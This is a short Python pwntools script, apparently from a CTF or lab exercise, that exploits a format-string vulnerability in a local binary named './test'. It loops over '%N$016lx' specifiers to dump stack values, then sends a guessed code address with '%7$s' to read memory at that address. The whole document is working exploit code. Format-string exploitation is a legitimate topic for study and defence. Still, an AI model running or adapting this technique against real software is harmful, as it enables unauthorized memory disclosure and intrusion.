from pwn import *

p = process('./test')

def dump_stack():
#extract 512 dwords from the stack !
    for i in range (1, 512):
        p.sendline('%{}$016lx'.format(i))
        print p.recv()


#after manual analysis:
guess_ret_addr = 0x804853b # looks like a code segment

p.sendline(p32(guess_ret_addr)+'%7$s')
print p.recv()
